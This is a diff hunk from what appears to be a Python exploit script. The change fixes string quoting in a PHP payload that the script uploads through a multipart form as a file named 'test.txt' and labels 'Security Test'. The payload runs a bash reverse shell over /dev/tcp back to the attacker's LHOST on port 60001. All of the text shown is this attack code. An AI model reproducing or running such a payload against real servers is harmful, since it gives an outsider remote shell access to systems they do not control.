@@ -9,7 +9,7 @@ LPORT="60001"
 def setup(host, port):
     TAG="Security Test"
     
-    PAYLOAD="""%s\r<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+str(LHOST)+"/"+str(LPORT)+" 0>&1'\");?>\r""" % TAG
+    PAYLOAD="""%s\r<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"""+str(LHOST)+"/"+str(LPORT)+""" 0>&1'\");?>\r""" % TAG
 
     REQ1_DATA="""-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
